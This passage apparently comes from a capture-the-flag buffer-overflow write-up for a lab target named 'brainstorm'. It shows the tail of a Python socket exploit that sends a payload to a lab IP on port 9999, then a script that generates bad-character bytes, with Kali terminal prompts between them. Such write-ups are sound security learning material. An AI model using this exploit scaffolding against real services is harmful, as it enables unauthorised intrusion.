    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.10.99.157', 9999))
    s.recv(1024)
    s.recv(1024)
    s.send(username + b'\r\n')
    s.recv(1024)
    s.send(message + b'\r\n')
    s.recv(1024)
    s.close()

except:
    print("Connot Connect")
    sys.exit()
                              

                                                                                    
                          
──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ python exploit.py                      
Sending Payload...
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ nano badchar.py
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ cat badchar.py 
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
